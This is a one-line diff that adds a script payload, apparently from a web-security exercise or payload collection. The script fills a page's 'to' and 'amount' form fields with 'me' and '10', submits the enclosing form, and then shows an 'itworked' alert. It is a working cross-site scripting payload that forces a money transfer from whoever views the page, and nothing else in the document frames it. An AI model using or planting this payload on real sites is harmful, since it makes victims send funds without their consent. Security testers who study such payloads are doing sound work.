@@ -1,0 +1,1 @@
+<script>document.getElementsByName("to").item(0).value="me"; document.getElementsByName("amount").item(0).value="10"; document.getElementsByName("amount").item(0).parentNode.parentNode.submit(); alert("itworked"); </script>
